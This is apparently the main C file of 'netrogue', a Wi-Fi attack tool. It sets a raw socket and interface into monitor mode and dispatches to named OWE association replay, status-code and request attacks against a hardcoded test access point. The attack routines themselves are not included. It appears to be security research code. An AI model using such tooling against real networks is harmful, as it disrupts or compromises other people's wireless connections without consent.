#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "helper.h"
#include "attack.h"


static uint8_t *get_interface_mac(int raw_socket, struct ifreq *ifr);

//set interface to monitor mode. Return value of -1 indicates failure. 0 indicated success
//if interface is already monitor mode, does nothing
static int set_interface_mode_monitor(int raw_socket, struct ifreq *ifr);

//set interface up/down. -1 indicates failure. 0 indicates success
static int set_interface_status(int raw_socket, struct ifreq *ifr, bool up);

//set interface channel
static int set_interface_channel(int raw_socket, struct iwreq iwr, int channel);


int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage: ./netrogue [interface] [attack]\n\nPossible attacks:\n\towe_asso_resp_replay\n\towe_asso_resp_code\n\towe_asso_req\n");
        exit(-1);
    }

    intf_info intf_info = {.name = argv[1], .mac = NULL};
    int intf_mode;

    //**************************************************
    //Used only during testing

    ap_info ap_info = {.ssid = "MikroTik_OWE", .mac = {0xd4, 0x01, 0xc3, 0x1d, 0xd3, 0xbe}};
    
    //*************************************************

    struct ifreq ifr;
    struct sockaddr_ll ll;
    int raw_socket;


    raw_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (raw_socket < 0)
    {
        printf("[-] Error declaring the raw socket!\n");
        return 1;
    }

    printf("[+] Succesfully defined raw socket!\n");
    
    strncpy(ifr.ifr_name, intf_info.name, sizeof(ifr.ifr_name));

    //this ioctl call gets interfaces index, but it can also be used to verify existance of interface
    if (ioctl(raw_socket, SIOCGIFINDEX, &ifr) < 0)
    {
        printf("[-] Couldn't find interface with name %s\n", intf_info.name);
        exit(-1);
    }

    ll.sll_ifindex = ifr.ifr_ifindex;
    ll.sll_protocol = htons(ETH_P_ALL);
    ll.sll_family = PF_PACKET;

    intf_info.mac = get_interface_mac(raw_socket, &ifr);
    if (intf_info.mac == NULL)
    {
        printf("[-] Error retrieving interface mac address\n");
        exit(-1);
    }

    if (set_interface_mode_monitor(raw_socket, &ifr) < 0)
    {
        printf("[-] Failed while setting the interface to monitor mode\n");
        exit(-1);
    }

    //****************************************
    //
    //     Need to kill network manager
    //
    //****************************************


    if (bind(raw_socket, (struct sockaddr *)&ll, sizeof(ll)) < 0)
    {
        printf("[-] Failed to bind!\n");
        return 2;
    }

    printf("[+] Successfully binded!\n");

    if (strcmp(argv[2], "owe_asso_resp_replay") == 0)
        owe_asso_resp_replay_attack(raw_socket, &ap_info, &intf_info);
    else if (strcmp(argv[2], "owe_asso_resp_code") == 0)
        owe_asso_resp_code_attack(raw_socket, &ap_info, &intf_info);
    else if (strcmp(argv[2], "owe_asso_req") == 0)
        owe_asso_req_attack(raw_socket, &ap_info);
    else
        printf("[-] Invalid attack name!");
    return 0;
}


static uint8_t *get_interface_mac(int raw_socket, struct ifreq *ifr)
{
    if (ioctl(raw_socket, SIOCGIFHWADDR, ifr) < 0) {
        return NULL;
    }
    uint8_t *mac_buffer = malloc(MAC_LEN);
    memcpy(mac_buffer, ifr->ifr_hwaddr.sa_data, 6);
    return mac_buffer;
}

static int set_interface_mode_monitor(int raw_socket, struct ifreq *ifr)
{
    struct iwreq iwr;
    strncpy(iwr.ifr_name, ifr->ifr_name, IFNAMSIZ);

    if (ioctl(raw_socket, SIOCGIWMODE, &iwr) < 0)
    {
        printf("[-] Error retrieving interface mode\n");
        return -1;
    }
    
    if (iwr.u.mode != IW_MODE_MONITOR)
    {
        printf("[ ] Setting the interface to monitor mode\n");
        iwr.u.mode = IW_MODE_MONITOR;
    } else
    {
        //interface already is monitor mode.
        if (set_interface_channel(raw_socket, iwr, 6) < 0)
            return -1;
        return 0; //interface already is monitor mode.
    }


    //set interface down
    if (set_interface_status(raw_socket, ifr, false) < 0)
        return -1;


    if (ioctl(raw_socket, SIOCSIWMODE, &iwr) < 0)
    {
        printf("[-] Error setting the interface to monitor mode\n");
        return -1;
    }

    //*****************************************************
    // This is only during testing.
    // Will be later changed during development

    //This sets the interface to channel 6

    if (set_interface_channel(raw_socket, iwr, 6) < 0)
            return -1;

    //*****************************************************

    //set interface up
    if (set_interface_status(raw_socket, ifr, true) < 0)
        return -1;


    printf("[+] Successfully set the interface to monitor mode\n");
    return 0;
}

static int set_interface_status(int raw_socket, struct ifreq *ifr, bool up)
{
    //Get current flags
    if (ioctl(raw_socket, SIOCGIFFLAGS, ifr) < 0)
    {
        printf("[-] Error getting interface flags\n");
        return -1;
    }

    if (up)
        ifr->ifr_flags |= IFF_UP;
    else
        ifr->ifr_flags &= ~IFF_UP;

    //Set flags
    if (ioctl(raw_socket, SIOCSIFFLAGS, ifr) < 0)
    {
        printf("[-] Error setting interface flags\n");
        return -1;
    }
    return 0;
}

static int set_interface_channel(int raw_socket, struct iwreq iwr, int channel)
{
    iwr.u.freq.m = channel;
    iwr.u.freq.e = 0;
    
    if (ioctl(raw_socket, SIOCSIWFREQ, &iwr) < 0) {
        printf("[-] Error setting the interface to channel 6\n");
        return -1;
    }

    printf("[+] Successfully set the interface to channel 6\n");

    return 0;
}
